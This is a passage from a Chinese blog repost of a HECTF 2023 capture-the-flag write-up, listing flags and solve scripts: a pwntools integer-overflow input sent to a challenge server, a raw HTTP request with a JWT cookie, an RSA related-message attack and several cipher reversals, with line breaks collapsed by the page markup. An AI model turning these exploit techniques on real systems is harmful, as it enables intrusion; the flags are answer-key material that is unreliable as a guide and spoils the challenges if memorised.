class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">HECTF&#123;Welcome_To_HECTF_2023&#125;</span><br><span class="line">HECTF&#123;河北省邯郸市永年区永年太极广场&#125;</span><br><span class="line">密码：X2z0Um23RF</span><br><span class="line">https://www.bilibili.com/video/BV1Lj41187kx/</span><br><span class="line">small joker -&gt; kafbig joker -&gt; wi1</span><br><span class="line">HECTF&#123;Dou_di_Zhu_uhZ_id_uoD_hEccctf_TY6d145A57R7WVz&#125;</span><br><span class="line">恭喜weber获得最后的flag：</span><br><span class="line"></span><br><span class="line">HECTF&#123;java_ca_fei_bao_bei&#125;</span><br><span class="line">HECTF&#123;fca812f055d5fdcd3a355b63ceaad991&#125;</span><br><span class="line">HECTF&#123;T31s_1s_A_mAg1ca1_3h1ng&#125;</span><br><span class="line">HECTF&#123;jjjjjljjjlljlllkklkkkhhh&#125;</span><br><span class="line">a = [0x4d, 0x42, 0x44, 0x51, 0x3f, 0x7c, 0x4f, 0x6a, 0x58, 0x74, 0x34, 0x62, 0x6a, 0x74, 0x58, 0x6f, 0x34, 0x73, 0x7e, 0x58, 0x74, 0x36, 0x6a, 0x75, 0x69, 0x34, 0x7a]</span><br><span class="line">for i in range(len(a)):    a[i] = (a[i] + 1) ^ 6    print(chr(a[i]),end=&#x27;&#x27;)</span><br><span class="line">HECTF&#123;Vm_s3ems_v3ry_s1mpl3&#125;</span><br><span class="line">from pwn import *</span><br><span class="line">r = remote(&quot;101.133.164.228&quot;,30380)pl = &#x27;-4294967230&#x27;r.sendline(pl)</span><br><span class="line">r.interactive()</span><br><span class="line">POST /404.php HTTP/1.1Host: 101.133.164.228:</span><br><span class="line">32385User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:</span><br><span class="line">109.0) Gecko/20100101 Firefox/119.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 6Origin: http://101.133.164.228:</span><br><span class="line">32385Connection: closeReferer: http://101.133.164.228:</span><br><span class="line">32385/404.phpCookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjExIn0.YrHwWF1RRyxqpta2G-dnwRRjoq53lCOLYVxv4l_BLMI; seed=976696390Upgrade-Insecure-Requests: 1</span><br><span class="line">sort=1</span><br><span class="line">HECTF&#123;Jia_You_Weber&#125;</span><br><span class="line">114514</span><br><span class="line">#脚本1#Sage</span><br><span class="line">import binascii</span><br><span class="line">def attack(c1, c2, n, e):    PR.&lt;x&gt;=PolynomialRing(Zmod(n))    # replace a,b,c,d    g1 = (30509*x+13601)**e - c1    g2 = (92095*x+27065)**e - c2</span><br><span class="line">    def gcd(g1, g2):        while g2:            g1, g2 = g2, g1 % g2        return g1.monic()    return -gcd(g1, g2)[0]c = 23001012057110779471190091625946693776382380529397302126337301229214301450335125076016991835054198112255974220434689958104931664098817350134656616154892781885504255726632558690544057380195511404078662094726952602350250840712610362029824982069179543810686494204685887486972937880502875441232004432323308734978847464589775857815430854038396134952486665687531579988133729365443247597395131516449487146786214227230853061720614077115599878358089377114269765796099004940883513036567103436154122335792598432012140232905658895014924069330265282364249236142072335363164451294973492092043110680377767954710822286121195290921259n = 25797576442752368834409243494498462987370374608513814739930733437032797864549696772439769896270235017474841764016848627149724764584643408544417890463920153063835758878658712790547466715525246861709503145754424896044647787146006099053059124466248594151765065039034244830614724509092882854620642569723528913880146979990993657935598837645247839225413889995373643109990149255485373119338024345925311643249141660177285328457994476509430988280481564046398593906405870633323621548853838399385539924067139236445142933316057900841508972844270649504321178274091144241788883353514769368447833090379142367062327674855735832181241c1 = 5702553209026762891130621254037294747819864952568824327221430749829654552175171307151888953348659971422228556686092434932000213695492351602755144510029319044193567051613888876933660356756790444392278614143455408803808095980542751023095024106689759843322130186219560734082292015929006937318400901378373771587448471762923415750064340829545587346927358411518874090282598069394946985795177419501659425500481799157093068337225389827654860680897913114945871197415129055139716514884716404289565297854681809258375973195355836553939670482515484347869258398517276876478311544109924573128946617113822561968330536525876279165313c2 = 17562619948191690401152271053920025392401205523418067246455197241332062181407775133406742024747779181762812656501246379566147855594504112107873162350649668441267907193889705868572309785100582281795380779594946422800722070311908572538672508371123334385630310655242811756206073131919770939609347021343765434127086363844595938894714892990053114153402729297796655717510572619694559203260762574159375142757462082162882775921182437134358375300674547217425590072112733480640372328934982979603312597484512120618223179217692002851194538130349201457319160001114007059615596355221194709809437500052122684989302563103918409825040e = 17m1 = attack(c1, c2, n, e)print(binascii.unhexlify(&quot;%x&quot; % int(m1)))</span><br><span class="line">HECTF&#123;r3411y_easy_R4nd0m_And_r3l4ted_m3554ge_att4ck&#125;</span><br><span class="line">from Crypto.Util.number import long_to_bytes, bytes_to_long</span><br><span class="line">encrypted_message = b&#x27;xa1x14xa66x9cx88xe3xeco?xe2x95xbdxcdx1a2)ixf5_)x15Hxf2yxecx8dxfc*KUxefvxddxd0X&#x27;</span><br><span class="line"># 逆向 circular_shift_left 函数</span><br><span class="line">def circular_shift_left(int_value, k, bit=32):    bin_value = bin(int_value)[2:].zfill(32)    bin_value = bin_value[k:] + bin_value[:k]    int_value = int(bin_value, 2)    return int_value</span><br><span class="line">def dec_block(block):    block ^= 3279553481    block = circular_shift_left(block, 21)    block ^= 1909693462    block = long_to_bytes(block)    return block</span><br><span class="line"># 逆向 convert 函数</span><br><span class="line">def myfill(num,fill_num):</span><br><span class="line">    return bin(num)[2:].zfill(fill_num)</span><br><span class="line">n1 = myfill(2245263360,32)n2 = myfill(2029229568,32)def reverse_convert(c):    # 先将字节块转换为16进制字符串，然后去掉前缀 &#x27;0x&#x27;，最后填充至32位    c = c.hex()    c = myfill(int(c, 16), 32)</span><br><span class="line">    #4    m1 = int(c[:13],2)^int(c[-13:],2)    m1 = myfill(m1,13)    c = c[:19]+m1</span><br><span class="line">    #3    m1 = int(c[:15],2)^(int(c[-15:],2)&amp;int(n1[:15],2))    m1 = myfill(m1,15)    c = m1+c[15:]</span><br><span class="line">    #2    m1 = c[-9:]    m2 = int(c[-18:-9],2)^(int(m1,2)&amp;int(n2[-18:-9],2))    m2 = myfill(m2,9)    m3 = int(c[-27:-18],2)^(int(m2,2)&amp;int(n2[-27:-18],2))    m3 = myfill(m3,9)    m4 = int(c[:5],2)^(int(m3[-5:],2)&amp;int(n2[:5],2))    m4 = myfill(m4,5)    c = m4+m3+m2+m1</span><br><span class="line">    #1    m1 = int(c[13:26],2)^int(c[:13],2)    m1 = myfill(m1,13)    m2 = int(m1[:6],2)^int(c[-6:],2)    m2 = myfill(m2,6)    c = c[:13]+m1+m2</span><br><span class="line">    return int(c, 2)</span><br><span class="line"></span><br><span class="line"># 解密整个消息</span><br><span class="line">def my_decblock(encrypted_message):    assert len(encrypted_message) % 4 == 0    decrypted_message = b&#x27;&#x27;    IV = bytes_to_long(b&#x27;retu&#x27;)    blocks = [encrypted_message[i:i + 4] for i in range(0, len(encrypted_message), 4)]</span><br><span class="line">    # 解密每个块    for i in range(len(blocks)):        block = bytes_to_long(blocks[i])        block ^= IV        block = dec_block(block)        block = reverse_convert(block)  # reverse_convert 现在返回整数        IV = bytes_to_long(blocks[i])  # 更新 IV 为当前块的密文        decrypted_message += long_to_bytes(block, 4)  # block 现在是整数</span><br><span class="line">    return decrypted_message</span><br><span class="line"># 解密得到flagflag = my_decblock(encrypted_message)print(&quot;Recovered flag:&quot;, flag)</span><br><span class="line">Recovered flag: b&#x27;HECTF&#123;spodjoqw321jp3ij09adfiosofrga&#125;&#x27;</span><br><span class="line">def caesar_cipher_decrypt(char, shift):    # 将字符转换为其ASCII码值    ascii_value = ord(char)    # 减去偏移量    shifted_value = ascii_value - shift    # 将偏移后的ASCII码值转换回字符    return chr(shifted_value)</span><br><span class="line">def split_and_decrypt(text, group_size):    groups = [text[i:i+group_size] for i in range(0, len(text), group_size)]    decrypted_groups = []    for i, group in enumerate(groups):        shift = i + 1        decrypted_group = &#x27;&#x27;.join(caesar_cipher_decrypt(char, shift) for char in group)        decrypted_groups.append(decrypted_group)    return decrypted_groups</span><br><span class="line"># 示例字符串input_text = &quot;zpvepoudbsgcdqwvjgocqg|rxrqo|feviefsyx&#125;szwt|skqfl?NKIZLYZUVfU|jslhyfzmiom&quot;# 按照要求分组和解密result = split_and_decrypt(input_text, 10)</span><br><span class="line"># 输出结果for i, group in enumerate(result):    print(f&quot;Group &#123;i+1&#125;: &#123;group&#125;&quot;)</span><br><span class="line">HECTF&#123;STOP_Nuclear_sewage&#125;</span><br><span class="line">from Crypto.Cipher import AESfrom Crypto.Util.number import long_to_bytesxor_result = 113271863767201424639329153097952947311122854394813183532903131317262533549675encrypted_flag = b&#x27;_1x16xc2;xb1xddyx14xddx14xe5&#123;x19x04:&#x27;xor_result_bytes = long_to_bytes(xor_result)key_high = xor_result_bytes[:16]secret_key = key_high + key_highxor_result_low = xor_result_bytes[-16:]init_vector = bytes(a ^ b for a, b in zip(secret_key[:16], xor_result_low))cipher = AES.new(secret_key, AES.MODE_CBC, init_vector)decrypted_flag = cipher.decrypt(encrypted_flag)print(f&quot;Decrypted flag: &#123;decrypted_flag&#125;&quot;)</span><br><span class="line"># Decrypted flag: b&#x27;RSAKEYISFTCEHx00x00x01&#x27;</span><br><span class="line">e=65537n=: 17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261c=:</span><br><span class="line">7650350848303138131393086727727533413756296838218347123997040508192472569084746342253915001354023303648603939313635106855058934664365503492172没了 真没了 加油少年</span><br><span class="line">keyisEa51stRsA</span><br><span class="line">gIHkeIlRQp1fLeSWEqZJdOTO4aRYRB2OGRcBycHQ1OAdi6UEULYbwIvYh+0alYScSEoN4TOejgTj</span><br><span class="line">dPsetrURRlLX6dcifjX6VvLxY7TnMk7c8/xy17mybq/yNQf0vFGh8byC88bUeHian9dA2Qh6rRBY</span><br><span class="line">S1I7iNxM62RtCFZ+1OKeaqGIDjf3/VuPlbnCePYIY5FVs6xNXjkGh0m57t2QW4CoGI5lz6OcAAwg</span><br><span class="line">4AHP0d8CfeldOF/TogPwOiPaRlDbtHXCh54Bs5ZivV+jDerr0RQvCGYBFHYLJnvyrFtyZC9BxAQ8</span><br><span class="line">gQnGlWNDjE1V6BByUvJjpI9DcUyRSNN21rUWouOiLwtKX0BgDQkGH9PhtzhmGYI+R3lZJ4x30l+X</span><br><span class="line">qweu</span><br><span class="line">DES CBC PKCS7 key：hectf iv：0000</span><br><span class="line">你知道么？梵蒂冈的常住人口只有800人，同时，仅澳大利亚就有4700万只袋鼠。如果袋鼠决定入侵梵蒂冈，那么每一个梵蒂冈人要打58750只袋鼠，你不知道！你不在乎！你只关心你自己的flagHECTF&#123;DES_RSA_AES_WOMENSA_ZHENQIANG&#125;</span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h2 id="附图"><a href="#附图" class="headerlink" title="附图"></a>附图</h2><p>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]</p>
+<hr>
+<blockquote>
+<p><strong>转载声明</strong>：本文转载自 <a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge">Des-CTF-Knowledge</a>（MIT License），版权归原作者所有，转载请注明出处；如原作者不希望被转载，请联系删除。<br>原文链接：<a target="_blank" rel="noopener" href="https://www.ctfiot.com/147010.html">https://www.ctfiot.com/147010.html</a><br>仓库原文：<a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/CTF%E5%A4%A7%E8%B5%9BWP%E9%9B%86%E5%90%88/articles/HECTF-2023_WriteUp.full.md">CTF大赛WP集合&#x2F;articles&#x2F;HECTF-2023_WriteUp.full.md</a></p>
+</blockquote>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/osint/">osint</a></div><div class="post_share"><div class="social-share" data-image="/img/youli.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/01/01/ctf-kb/wp/Misc/HDCTF_2023_WP/" title="HDCTF 2023 WP"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">HDCTF 2023 WP</div></div></a></div><div class="next-post pull-right"><a href="/2023/01/01/ctf-kb/wp/Misc/Huntress_CTF_2023_-_Write-up/" title="Huntress CTF 2023 Write-up"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Huntress CTF 2023 Write-up</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/01/01/ctf-kb/wp/Crypto/DIVER_OSINT_CTF_2024_writeup/" title="DIVER OSINT CTF 2024 writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-01-01</div><div class="title">DIVER OSINT CTF 2024 writeup</div></div></a></div><div><a href="/2025/01/01/ctf-kb/wp/Crypto/DIVER_OSINT_CTF_2025_Writeup/" title="DIVER OSINT CTF 2025 Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-01</div><div class="title">DIVER OSINT CTF 2025 Writeup</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/youli.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">朴冬</div><div class="author-info__description">琐碎的学习记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0"><i class="fab fa-bilibili"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/PUDONGGGGGG" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/2559874620@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #1797cf;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%86%E5%90%91-circular-shift-left-%E5%87%BD%E6%95%B0"><span class="toc-number">1.</span> <span class="toc-text">逆向 circular_shift_left 函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%86%E5%90%91-convert-%E5%87%BD%E6%95%B0"><span class="toc-number">2.</span> <span class="toc-text">逆向 convert 函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A7%A3%E5%AF%86%E6%95%B4%E4%B8%AA%E6%B6%88%E6%81%AF"><span class="toc-number">3.</span> <span class="toc-text">解密整个消息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A7%A3%E5%AF%86%E5%BE%97%E5%88%B0flagflag-my-decblock-encrypted-message-print-%E2%80%9CRecovered-flag-%E2%80%9D-flag"><span class="toc-number">4.</span> <span class="toc-text">解密得到flagflag &#x3D; my_decblock(encrypted_message)print(“Recovered flag:”, flag)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E5%AD%97%E7%AC%A6%E4%B8%B2input-text-%E2%80%9Czpvepoudbsgcdqwvjgocqg-rxrqo-feviefsyx-szwt-skqfl-NKIZL%C2%81YZUVfU-jslhyfzmiom%C2%85%E2%80%9D-%E6%8C%89%E7%85%A7%E8%A6%81%E6%B1%82%E5%88%86%E7%BB%84%E5%92%8C%E8%A7%A3%E5%AF%86result-split-and-decrypt-input-text-10"><span class="toc-number">5.</span> <span class="toc-text">示例字符串input_text &#x3D; “zpvepoudbsgcdqwvjgocqg|rxrqo|feviefsyx}szwt|skqfl?NKIZLYZUVfU|jslhyfzmiom”# 按照要求分组和解密result &#x3D; split_and_decrypt(input_text, 10)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%E7%BB%93%E6%9E%9Cfor-i-group-in-enumerate-result-print-f%E2%80%9DGroup-i-1-group-%E2%80%9D"><span class="toc-number">6.</span> <span class="toc-text">输出结果for i, group in enumerate(result):    print(f”Group {i+1}: {group}”)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Decrypted-flag-b%E2%80%99RSAKEYISFTCEHx00x00x01%E2%80%99"><span class="toc-number">7.</span> <span class="toc-text">Decrypted flag: b’RSAKEYISFTCEHx00x00x01’</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E5%9B%BE"><span class="toc-number">7.1.</span> <span class="toc-text">附图</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/Dirsearch/" title="Dirsearch">Dirsearch</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/SCRIPTS-INDEX/" title="CTF 常用脚本索引">CTF 常用脚本索引</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/ffuf%E7%9A%84%E4%BD%BF%E7%94%A8/" title="ffuf的使用">ffuf的使用</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By 朴冬</div><div class="footer_custom_text">Welcome</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
